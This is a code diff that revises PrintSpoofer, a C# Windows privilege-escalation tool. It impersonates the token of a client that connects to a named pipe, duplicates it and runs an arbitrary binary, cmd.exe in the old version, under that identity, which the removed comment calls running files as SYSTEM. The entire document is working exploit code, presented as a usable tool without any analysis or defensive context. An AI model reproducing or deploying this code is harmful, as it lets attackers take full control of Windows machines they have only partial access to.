@@ -1,25 +1,19 @@
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
 
-namespace PrintSpooferNet
+namespace PrintSpoofer
 {
-    class Program
+    public class Program
     {
-        [StructLayout(LayoutKind.Sequential)]
-        public struct SID_AND_ATTRIBUTES
-        {
-            public IntPtr Sid;
-            public int Attributes;
-        }
-
-        public struct TOKEN_USER
-        {
-            public SID_AND_ATTRIBUTES User;
-        }
+        public static uint PIPE_ACCESS_DUPLEX = 0x3;
+        public static uint PIPE_TYPE_BYTE = 0x0;
+        public static uint PIPE_WAIT = 0x0;
+        public static uint TOKEN_ALL_ACCESS = 0xF01FF;
+        public static uint TOKENUSER = 1;
+        public static uint SECURITY_IMPERSONATION = 2;
+        public static uint TOKEN_PRIMARY = 1;
 
         [StructLayout(LayoutKind.Sequential)]
         public struct PROCESS_INFORMATION
@@ -29,7 +23,6 @@ namespace PrintSpooferNet
             public int dwProcessId;
             public int dwThreadId;
         }
-
         [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
         public struct STARTUPINFO
         {
@@ -53,8 +46,21 @@ namespace PrintSpooferNet
             public IntPtr hStdError;
         }
 
-        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
-        public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+        public enum CreationFlags
+        {
+            DefaultErrorMode = 0x04000000,
+            NewConsole = 0x00000010,
+            NewProcessGroup = 0x00000200,
+            SeparateWOWVDM = 0x00000800,
+            Suspended = 0x00000004,
+            UnicodeEnvironment = 0x00000400,
+            ExtendedStartupInfoPresent = 0x00080000
+        }
+        public enum LogonFlags
+        {
+            WithProfile = 1,
+            NetCredentialsOnly
+        }
 
         [DllImport("kernel32.dll", SetLastError = true)]
         static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
@@ -65,57 +71,76 @@ namespace PrintSpooferNet
         [DllImport("Advapi32.dll")]
         static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
 
-        [DllImport("kernel32.dll")]
-        private static extern IntPtr GetCurrentThread();
-
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);
 
-        [DllImport("advapi32.dll", SetLastError = true)]
-        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentThread();
 
-        [DllImport("advapi32", CharSet = CharSet.Auto, SetLastError = true)]
-        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public extern static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);
-        static void Main(string[] args)
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        static extern bool RevertToSelf();
+
+        [DllImport("kernel32.dll")]
+        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);
+
+        [DllImport("userenv.dll", SetLastError = true)]
+        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);
+
+        public static void Main(string[] args)
         {
-            if (args.Length == 0)
+            // Parse arguments (pipe name)
+            if (args.Length != 2)
             {
-                Console.WriteLine("Usage: PrintSpooferNet.exe pipename");
+                Console.WriteLine("Please enter the pipe name to be used and the binary to trigger as arguments.\nExample: .\\PrintSpoofer.exe \\\\.\\pipe\\test\\pipe\\spoolss c:\\windows\\tasks\\bin.exe");
                 return;
             }
             string pipeName = args[0];
-            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
+            string binToRun = args[1];
 
-            ConnectNamedPipe(hPipe, IntPtr.Zero);
+            // Create our named pipe
+            IntPtr hPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
 
-            ImpersonateNamedPipeClient(hPipe);
+            // Connect to our named pipe and wait for another client to connect
+            Console.WriteLine("Waiting for client to connect to named pipe...");
+            bool result = ConnectNamedPipe(hPipe, IntPtr.Zero);
 
-            IntPtr hToken;
-            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
+            // Impersonate the token of the incoming connection
+            result = ImpersonateNamedPipeClient(hPipe);
 
-            int TokenInfLength = 0;
-            GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
-            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
-            GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);
+            // Open a handle on the impersonated token
+            IntPtr tokenHandle;
+            result = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, out tokenHandle);
 
-            TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
-            IntPtr pstr = IntPtr.Zero;
-            Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
-            string sidstr = Marshal.PtrToStringAuto(pstr);
-            Console.WriteLine(@"Found sid {0}", sidstr);
+            // Duplicate the stolen token
+            IntPtr sysToken = IntPtr.Zero;
+            DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, IntPtr.Zero, SECURITY_IMPERSONATION, TOKEN_PRIMARY, out sysToken);
 
-            IntPtr hSystemToken = IntPtr.Zero;
-            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);
+            // Create an environment block for the non-interactive session
+            IntPtr env = IntPtr.Zero;
+            bool res = CreateEnvironmentBlock(out env, sysToken, false);
 
-            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            STARTUPINFO si = new STARTUPINFO();
-            si.cb = Marshal.SizeOf(si);
+            // Get the impersonated identity and revert to self to ensure we have impersonation privs
+            String name = WindowsIdentity.GetCurrent().Name;
+            Console.WriteLine($"Impersonated user is: {name}.");
+            RevertToSelf();
 
-            // 修改下列路径, 来以 SYSTEM 权限执行不同的文件 : 
-            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\cmd.exe", 0, IntPtr.Zero, null, ref si, out pi);
+            // Get the system directory
+            StringBuilder sbSystemDir = new StringBuilder(256);
+            uint res1 = GetSystemDirectory(sbSystemDir, 256);
+
+            // Spawn a new process with the duplicated token, a desktop session, and the created profile
+            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+            STARTUPINFO sInfo = new STARTUPINFO();
+            sInfo.cb = Marshal.SizeOf(sInfo);
+            sInfo.lpDesktop = "WinSta0\\Default";
+            CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, null, binToRun, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref sInfo, out pInfo);
+            Console.WriteLine($"Executed '{binToRun}' with impersonated token!");
         }
     }
 }
